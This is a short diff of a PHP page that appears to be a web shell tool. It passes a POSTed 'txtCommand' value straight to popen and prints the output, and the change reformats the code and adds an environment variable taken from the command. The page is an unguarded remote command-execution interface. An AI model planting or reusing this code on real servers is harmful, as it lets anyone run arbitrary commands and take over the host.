@@ -189,13 +189,14 @@ on your own risk!</strong></p>
 <?php
 
 if (!isBlank($_POST['txtCommand'])) {
-   puts( "<pre>" );
-   puts( "\$ " . htmlspecialchars($_POST['txtCommand']) );
+   puts("<pre>");
+   puts("\$ " . htmlspecialchars($_POST['txtCommand']));
    putenv("PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin");
-   $ph = popen( $_POST['txtCommand'], "r" );
-   while ($line = fgets( $ph )) echo htmlspecialchars( $line );
-   pclose( $ph );
-   puts( "</pre>" );
+   putenv("SCRIPT_FILENAME=" . strtok($_POST['txtCommand'], " "));	/* PHP scripts */
+   $ph = popen($_POST['txtCommand'], "r" );
+   while ($line = fgets($ph)) echo htmlspecialchars($line);
+   pclose($ph);
+   puts("</pre>");
 }
 
 ?>
